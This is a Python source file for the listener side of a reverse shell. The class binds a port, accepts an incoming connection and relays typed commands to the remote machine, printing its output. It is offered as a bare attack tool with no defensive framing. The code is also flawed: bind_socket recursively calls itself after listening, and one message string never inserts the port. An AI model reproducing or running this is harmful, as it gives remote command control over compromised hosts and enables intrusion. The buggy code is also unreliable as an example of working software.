import socket
import sys



class ReverseShell():

	def __init__(self,host,port):
		try:
			self.host = host 
			self.port = port
			self.s = socket.socket()
		except socket.error as msg:
			print( "Socket Creation Error {}".format(msg) )


	# Binding The socket and listning for connection
	def bind_socket(self):
		try:
			print( "Binding the Port".format(self.port) )

			self.s.bind( ( self.host, self.port ) )
			self.s.listen(5)

			print("Listning...")
			self.bind_socket()

		except socket.error as msg:
			print(" Socket Binding Error {}\n Retrying......".format(msg) )

	# Establish Connection with client ( socket must be listning )
	def socket_accept(self):
		self.conn,self.address = self.s.accept()
		print("Connection has been Established! IP:{} PORT:{}".format( self.address[0],self.address[1] ) )
		self.send_command()
		self.conn.close()

	#Send command to client 
	def send_command(self):
		flag=0
		while True:
			if flag==0:
				cmd = input("cmd>>>")
				flag=1
			else:
				cmd = input()

			if cmd=="quit":
				self.conn.close()
				self.s.close()
				exit()
			elif len(str.encode( cmd )) > 0 :
				self.conn.send( str.encode(cmd) )
				client_response = str( self.conn.recv(1024), "utf-8" )
				print( client_response, end="" )


if __name__=="__main__":
	shell = ReverseShell(sys.argv[1],9999)
	shell.bind_socket()
	shell.socket_accept()
